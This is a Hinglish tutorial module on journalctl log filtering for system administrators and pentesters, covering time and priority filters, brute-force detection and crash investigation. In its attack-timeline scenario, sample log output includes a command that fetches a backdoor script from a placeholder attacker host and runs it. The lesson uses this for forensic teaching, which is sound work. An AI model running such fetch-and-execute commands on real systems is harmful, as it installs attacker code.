# **Module 11: Advanced Logging & Auditing** ğŸ“ŠğŸ”

---

## **Topic 1: journalctl Advanced Filtering** ğŸ“ğŸ”

---

### **1ï¸âƒ£ Topic Summary (1-2 lines)**

journalctl systemd ka powerful log viewing tool hai jo system aur service logs ko query, filter, aur analyze karne ke liye advanced options provide karta hai - time-based filtering, priority levels, aur real-time monitoring ke saath.

---

### **2ï¸âƒ£ Detailed Explanation with Analogy** ğŸ§ 

**Kya hai journalctl?**

journalctl systemd-journald service ka command-line interface hai jo system logs ko binary format mein store karta hai. Traditional text-based logs (`/var/log/syslog`) se zyada powerful aur structured hai.

**journalctl Features:**

1. **Structured Logging** - Metadata ke saath logs (timestamp, priority, service)
2. **Fast Searching** - Binary format = fast queries
3. **Time-based Filtering** - Specific time range ke logs
4. **Priority Filtering** - Error, warning, info levels
5. **Service-specific Logs** - Specific service ke logs
6. **Real-time Monitoring** - Live log streaming

**Analogy:**

journalctl ek **advanced search engine** ki tarah hai jo system logs ke liye hai. Jaise Google mein aap "site:example.com after:2024-01-01" search kar sakte ho, waise hi journalctl mein "show me SSH logs from yesterday with priority error" - powerful filtering!

---

### **3ï¸âƒ£ Why is this Important?** ğŸ¯

**Sysadmin Perspective:**
- Troubleshooting service failures
- Security incident investigation
- Performance monitoring
- System health checks
- Audit trail for compliance
- Quick problem identification

**Pentester Perspective:**
- Attack traces in logs
- Failed login attempts analysis
- Service exploitation evidence
- Privilege escalation traces
- Log tampering detection
- Timeline reconstruction

---

### **4ï¸âƒ£ Real-World Use Cases** ğŸ’¼

**Admin Use Cases:**
1. SSH failed login attempts check karna
2. Service crash logs analyze karna
3. Specific time range ke errors dhundhna
4. Real-time log monitoring
5. Boot process troubleshooting

**Pentester Use Cases:**
1. Attack traces dhundhna
2. Failed authentication attempts
3. Sudo command history
4. Service exploitation logs
5. Log tampering evidence

---

### **5ï¸âƒ£ Consequences of Not Knowing** âš ï¸

**Admin Problems:**
- âŒ Troubleshooting time increase
- âŒ Security incidents miss karna
- âŒ Performance issues late detect
- âŒ Audit trail incomplete
- âŒ Root cause analysis difficult

**Pentester Problems:**
- âŒ Attack traces miss karna
- âŒ Log analysis incomplete
- âŒ Timeline reconstruction weak
- âŒ Evidence collection incomplete
- âŒ Forensic analysis limited

---

### **6ï¸âƒ£ Syntax & Command Structure** ğŸ“

#### **Basic journalctl Syntax:**
```bash
journalctl [options]

Common Options:
-u SERVICE      # Specific service logs
-p PRIORITY     # Filter by priority (0-7)
-n NUMBER       # Show last N entries
-f              # Follow (real-time)
-r              # Reverse order (newest first)
-b              # Current boot logs
--since TIME    # Logs since specific time
--until TIME    # Logs until specific time
-o FORMAT       # Output format
```

#### **Priority Levels:**
```
0: emerg   (Emergency - system unusable)
1: alert   (Alert - immediate action needed)
2: crit    (Critical)
3: err     (Error)
4: warning (Warning)
5: notice  (Notice)
6: info    (Info)
7: debug   (Debug)
```

---

### **7ï¸âƒ£ Detailed Examples with Explanation Tables** ğŸ’»

#### **Example 1: View All Logs**

```bash
journalctl
```

**Output:**
```
Jan 15 10:30:45 server systemd[1]: Started Session 123 of user admin.
Jan 15 10:30:46 server sshd[1234]: Accepted publickey for admin from 192.168.1.100
Jan 15 10:31:00 server sudo[1235]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/ls
```

**Navigation:**
- `Space` - Next page
- `b` - Previous page
- `q` - Quit
- `/` - Search

---

#### **Example 2: Service-Specific Logs**

```bash
journalctl -u sshd
```

| Part | Explanation |
|------|-------------|
| `journalctl` | Log viewer command |
| `-u sshd` | Show only sshd service logs |

**Output:**
```
Jan 15 10:30:46 server sshd[1234]: Accepted publickey for admin
Jan 15 10:35:12 server sshd[1235]: Failed password for root from 192.168.1.200
Jan 15 10:35:15 server sshd[1235]: Connection closed by 192.168.1.200
```

---

#### **Example 3: Priority Filtering (Errors Only)**

```bash
journalctl -p err
```

| Part | Explanation |
|------|-------------|
| `-p err` | Show only error priority and above |

**Output:**
```
Jan 15 09:15:23 server systemd[1]: Failed to start nginx.service
Jan 15 09:20:45 server kernel: Out of memory: Kill process 1234
```

---

#### **Example 4: Time-based Filtering**

```bash
journalctl --since "2024-01-15 10:00:00" --until "2024-01-15 11:00:00"
```

| Part | Explanation |
|------|-------------|
| `--since` | Start time |
| `--until` | End time |

**Alternative formats:**
```bash
# Relative time
journalctl --since "1 hour ago"
journalctl --since "yesterday"
journalctl --since "2 days ago"
journalctl --since "10 minutes ago"

# Today's logs
journalctl --since today

# Yesterday's logs
journalctl --since yesterday --until today
```

---

#### **Example 5: Real-time Log Monitoring**

```bash
journalctl -f
```

| Part | Explanation |
|------|-------------|
| `-f` | Follow mode (like `tail -f`) |

**Use Case:** Live monitoring of system events.

**Combine with service:**
```bash
journalctl -u nginx -f
```

---

#### **Example 6: Last N Entries**

```bash
journalctl -n 50
```

| Part | Explanation |
|------|-------------|
| `-n 50` | Show last 50 log entries |

**Reverse order (newest first):**
```bash
journalctl -r -n 50
```

---

#### **Example 7: Boot Logs**

```bash
# Current boot logs
journalctl -b

# Previous boot logs
journalctl -b -1

# List all boots
journalctl --list-boots
```

**Output:**
```
-2 abc123... Mon 2024-01-13 09:00:00 UTCâ€”Mon 2024-01-13 18:00:00 UTC
-1 def456... Tue 2024-01-14 09:00:00 UTCâ€”Tue 2024-01-14 18:00:00 UTC
 0 ghi789... Wed 2024-01-15 09:00:00 UTCâ€”Wed 2024-01-15 10:30:45 UTC
```

---

#### **Example 8: Specific User Logs**

```bash
journalctl _UID=1000
```

| Part | Explanation |
|------|-------------|
| `_UID=1000` | Logs for user ID 1000 |

**Find UID:**
```bash
id username
# uid=1000(username) gid=1000(username)
```

---

#### **Example 9: Kernel Messages**

```bash
journalctl -k
```

| Part | Explanation |
|------|-------------|
| `-k` | Kernel messages only |

**Equivalent to:** `dmesg`

---

#### **Example 10: Output Formats**

```bash
# JSON format
journalctl -u sshd -n 5 -o json

# JSON pretty
journalctl -u sshd -n 5 -o json-pretty

# Short format (syslog-style)
journalctl -u sshd -n 5 -o short

# Verbose (all fields)
journalctl -u sshd -n 5 -o verbose
```

---

### **8ï¸âƒ£ Common Mistakes & How to Avoid** âŒâ¡ï¸âœ…

| Mistake | Problem | Solution |
|---------|---------|----------|
| Not using `-r` | Oldest logs first | Use `-r` for newest first |
| Forgetting `--since` | Too many logs | Always filter by time |
| No service filter | Overwhelming output | Use `-u SERVICE` |
| Not checking priority | Missing critical errors | Use `-p err` or `-p crit` |
| Ignoring boot logs | Boot issues missed | Check `journalctl -b` |
| Not using `-f` for monitoring | Manual refresh needed | Use `-f` for real-time |
| Forgetting to check disk space | Journal fills disk | Monitor `/var/log/journal/` |
| Not combining filters | Too broad results | Combine `-u`, `-p`, `--since` |

---

### **9ï¸âƒ£ Best Practices & Pro Tips** â­

**Admin Best Practices:**
1. âœ… **Time Filtering**: Always use `--since` for specific investigations
2. âœ… **Priority First**: Start with `-p err` to find critical issues
3. âœ… **Service Specific**: Use `-u` to focus on specific services
4. âœ… **Real-time Monitoring**: Use `-f` for live troubleshooting
5. âœ… **Boot Analysis**: Check `-b -1` for previous boot issues
6. âœ… **Disk Space**: Monitor journal size with `journalctl --disk-usage`
7. âœ… **Rotation**: Configure journal rotation in `/etc/systemd/journald.conf`
8. âœ… **Export**: Save important logs with `-o json` for analysis

**Pentester Pro Tips:**
1. ğŸ” **Failed Logins**: `journalctl -u sshd | grep "Failed password"`
2. ğŸ” **Sudo Commands**: `journalctl | grep "sudo.*COMMAND"`
3. ğŸ” **Service Restarts**: `journalctl -u SERVICE | grep "Started\|Stopped"`
4. ğŸ” **Errors Only**: `journalctl -p err --since today`
5. ğŸ” **User Activity**: `journalctl _UID=1000 --since "1 hour ago"`
6. ğŸ” **Authentication**: `journalctl -u systemd-logind`
7. ğŸ” **Timeline**: Use `--since` and `--until` for attack timeline
8. ğŸ” **Export Evidence**: `journalctl --since "attack-time" -o json > evidence.json`

---

### **ğŸ”Ÿ Real-World Scenarios** ğŸŒ

#### **Scenario 1: SSH Brute Force Detection (Admin)**

**Situation:** Server pe multiple failed SSH login attempts ho rahe hain.

**Solution:**
```bash
# Check failed SSH attempts
journalctl -u sshd --since today | grep "Failed password"

# Count failed attempts per IP
journalctl -u sshd --since today | grep "Failed password" | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr

# Output:
#  45 192.168.1.200
#  23 192.168.1.201
#  12 192.168.1.202

# Check specific IP
journalctl -u sshd | grep "192.168.1.200"

# Block IP with firewall
sudo ufw deny from 192.168.1.200
```

**Result:** Brute force attack detected aur blocked!

---

#### **Scenario 2: Service Crash Investigation (Admin)**

**Situation:** Nginx service crash ho gayi, reason pata karna hai.

**Solution:**
```bash
# Check nginx errors
journalctl -u nginx -p err --since "1 hour ago"

# Output:
# Jan 15 10:15:23 server nginx[1234]: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use)

# Check what's using port 80
sudo netstat -tulpn | grep :80

# Check nginx start attempts
journalctl -u nginx --since "1 hour ago" | grep "Starting\|Started\|Failed"

# View full context
journalctl -u nginx -n 100 -r
```

**Finding:** Port 80 already in use by another process!

---

#### **Scenario 3: Boot Failure Troubleshooting (Admin)**

**Situation:** System last boot mein fail hua tha, reason check karna hai.

**Solution:**
```bash
# List all boots
journalctl --list-boots

# Check previous boot logs
journalctl -b -1 -p err

# Output:
# Jan 14 09:05:12 server systemd[1]: Failed to start MySQL Database Server
# Jan 14 09:05:15 server kernel: Out of memory: Kill process 1234 (mysqld)

# Check specific service in previous boot
journalctl -b -1 -u mysql

# Check kernel messages
journalctl -b -1 -k
```

**Finding:** Out of memory killed MySQL during boot!

---

#### **Scenario 4: Attack Timeline Reconstruction (Pentester)**

**Situation:** Compromised server ka attack timeline reconstruct karna hai.

**Investigation:**
```bash
# Check authentication logs around attack time
journalctl -u sshd --since "2024-01-15 14:00:00" --until "2024-01-15 15:00:00"

# Output:
# 14:30:45 Failed password for root from 192.168.1.100
# 14:30:50 Failed password for admin from 192.168.1.100
# 14:31:00 Accepted password for admin from 192.168.1.100

# Check sudo commands after compromise
journalctl --since "2024-01-15 14:31:00" | grep "sudo.*COMMAND"

# Output:
# 14:32:15 admin : COMMAND=/bin/bash
# 14:33:00 admin : COMMAND=/usr/bin/wget http://attacker.com/backdoor.sh
# 14:33:30 admin : COMMAND=/bin/bash backdoor.sh

# Check service modifications
journalctl --since "2024-01-15 14:31:00" | grep "systemctl"

# Export timeline
journalctl --since "2024-01-15 14:00:00" --until "2024-01-15 16:00:00" -o json > attack_timeline.json
```

**Timeline:**
1. 14:30 - Brute force attempts
2. 14:31 - Successful login as admin
3. 14:32 - Privilege escalation to root
4. 14:33 - Backdoor downloaded and executed

---

#### **Scenario 5: Real-time Security Monitoring (Admin)**

**Situation:** Production server ka real-time security monitoring setup karna hai.

**Solution:**
```bash
# Terminal 1: Monitor SSH
journalctl -u sshd -f | grep --line-buffered "Failed\|Accepted"

# Terminal 2: Monitor sudo commands
journalctl -f | grep --line-buffered "sudo.*COMMAND"

# Terminal 3: Monitor errors
journalctl -f -p err

# Or combined monitoring script
cat > /usr/local/bin/security_monitor.sh << 'EOF'
#!/bin/bash
journalctl -f | grep --line-buffered -E "Failed password|sudo.*COMMAND|error|critical" | \
while read line; do
    echo "[$(date)] $line" | tee -a /var/log/security_monitor.log
    # Alert on critical events
    if echo "$line" | grep -q "Failed password"; then
        echo "ALERT: Failed login attempt" | mail -s "Security Alert" admin@example.com
    fi
done
EOF

chmod +x /usr/local/bin/security_monitor.sh

# Run in background
nohup /usr/local/bin/security_monitor.sh &
```

**Result:** Real-time security monitoring with email alerts!

---

### **1ï¸âƒ£1ï¸âƒ£ Checklist for Implementation** âœ…

**Admin Checklist:**
- [ ] journalctl basic commands practiced
- [ ] Time-based filtering understood
- [ ] Priority filtering configured
- [ ] Service-specific log viewing tested
- [ ] Real-time monitoring setup
- [ ] Boot log analysis practiced
- [ ] Journal disk usage monitored
- [ ] Log rotation configured
- [ ] Export procedures documented
- [ ] Team trained on journalctl

**Pentester Checklist:**
- [ ] Authentication logs analyzed
- [ ] Failed login attempts checked
- [ ] Sudo command history reviewed
- [ ] Service logs examined
- [ ] Error logs analyzed
- [ ] Timeline reconstruction practiced
- [ ] Evidence export procedures tested
- [ ] Log tampering checked
- [ ] User activity tracked
- [ ] Findings documented

---

### **1ï¸âƒ£2ï¸âƒ£ Frequently Asked Questions (FAQs)** â“

**Q1: journalctl vs /var/log/syslog - kya farak hai?**
**A:** 
- **journalctl**: Binary format, structured, fast searching, metadata-rich
- **/var/log/syslog**: Text format, traditional, grep-friendly

**Q2: Journal logs kitni space lete hain?**
**A:** Check with:
```bash
journalctl --disk-usage
# Archived and active journals take up 512.0M in the file system.
```

**Q3: Old logs kaise delete karein?**
**A:**
```bash
# Delete logs older than 7 days
sudo journalctl --vacuum-time=7d

# Keep only 500MB
sudo journalctl --vacuum-size=500M
```

**Q4: Kya logs permanent hain?**
**A:** By default, logs reboot ke baad delete ho jate hain. Permanent storage ke liye:
```bash
sudo mkdir -p /var/log/journal
sudo systemctl restart systemd-journald
```

**Q5: Specific process ke logs kaise dekhein?**
**A:**
```bash
journalctl _PID=1234
```

**Q6: Logs ko file mein export kaise karein?**
**A:**
```bash
journalctl -u nginx --since today > nginx_logs.txt
journalctl -u nginx --since today -o json > nginx_logs.json
```

**Q7: Real-time monitoring mein color kaise add karein?**
**A:**
```bash
journalctl -f | grep --color=always -E "error|failed|critical|$"
```

**Q8: Multiple services ke logs ek saath kaise dekhein?**
**A:**
```bash
journalctl -u nginx -u mysql -u sshd --since today
```

---

### **1ï¸âƒ£3ï¸âƒ£ Practice Tasks with Expected Output** ğŸ¯

#### **Task 1: View SSH Logs**
```bash
journalctl -u sshd -n 20
```

**Expected:** Last 20 SSH service log entries.

---

#### **Task 2: Find Today's Errors**
```bash
journalctl -p err --since today
```

**Expected:** All error-level logs from today.

---

#### **Task 3: Monitor Logs in Real-time**
```bash
journalctl -f
```

**Expected:** Live log stream (press Ctrl+C to stop).

---

#### **Task 4: Check Failed Login Attempts**
```bash
journalctl -u sshd --since "1 hour ago" | grep "Failed password"
```

**Expected:** List of failed SSH login attempts in last hour.

---

#### **Task 5: Export Logs to JSON**
```bash
journalctl -u nginx --since today -o json-pretty > nginx_logs.json
cat nginx_logs.json | head -20
```

**Expected:** JSON formatted nginx logs.

---

### **1ï¸âƒ£4ï¸âƒ£ Advanced Information & Edge Cases** ğŸš€

#### **Advanced Technique 1: Complex Filtering**

```bash
# Multiple conditions
journalctl -u sshd -p err --since "2024-01-15 10:00:00" --until "2024-01-15 11:00:00" -o json-pretty
```

---

#### **Advanced Technique 2: Field-based Filtering**

```bash
# Specific executable
journalctl _COMM=sshd

# Specific hostname
journalctl _HOSTNAME=server1

# Specific systemd unit
journalctl _SYSTEMD_UNIT=nginx.service
```

---

#### **Advanced Technique 3: Log Correlation**

```bash
# Find related logs by message ID
journalctl _MESSAGE_ID=<message-id>

# Find logs with specific field
journalctl FIELD=value
```

---

#### **Advanced Technique 4: Performance Analysis**

```bash
# Show boot time
systemd-analyze

# Show service startup times
systemd-analyze blame

# Critical chain
systemd-analyze critical-chain
```

---

#### **Edge Case 1: Persistent Storage**

```bash
# Enable persistent storage
sudo mkdir -p /var/log/journal
sudo systemd-tmpfiles --create --prefix /var/log/journal
sudo systemctl restart systemd-journald

# Configure in /etc/systemd/journald.conf
[Journal]
Storage=persistent
SystemMaxUse=500M
```

---

#### **Edge Case 2: Remote Logging**

```bash
# Forward logs to remote server
# In /etc/systemd/journald.conf
[Journal]
ForwardToSyslog=yes

# Configure rsyslog to forward
```

---

### **1ï¸âƒ£5ï¸âƒ£ Final Summary & Key Takeaways** ğŸ“Œ

**Key Concepts:**
1. **journalctl** - Systemd log viewer
2. **Time Filtering** - `--since` and `--until`
3. **Priority Levels** - 0 (emerg) to 7 (debug)
4. **Service Logs** - `-u SERVICE`
5. **Real-time** - `-f` for live monitoring

**Critical Commands:**
```bash
# Service logs
journalctl -u SERVICE

# Errors only
journalctl -p err

# Time range
journalctl --since "1 hour ago"

# Real-time
journalctl -f

# Boot logs
journalctl -b
```

**Admin Takeaways:**
- âœ… Use time filtering for investigations
- âœ… Start with error priority
- âœ… Monitor services in real-time
- âœ… Check boot logs for failures
- âœ… Export logs for analysis
- âœ… Configure log rotation
- âœ… Monitor disk usage

**Pentester Takeaways:**
- ğŸ” Check authentication logs
- ğŸ” Analyze failed login attempts
- ğŸ” Review sudo command history
- ğŸ” Reconstruct attack timelines
- ğŸ” Export evidence in JSON
- ğŸ” Check for log tampering
- ğŸ” Track user activity

**Remember:**
- journalctl = powerful log analysis
- Always filter by time and service
- Priority levels help focus
- Real-time monitoring for troubleshooting
- Export important logs

**Next Topic:** auditd - System ka 'CCTV Camera' ğŸ“¹

---

**Happy Log Analyzing! ğŸ“ŠğŸ”**
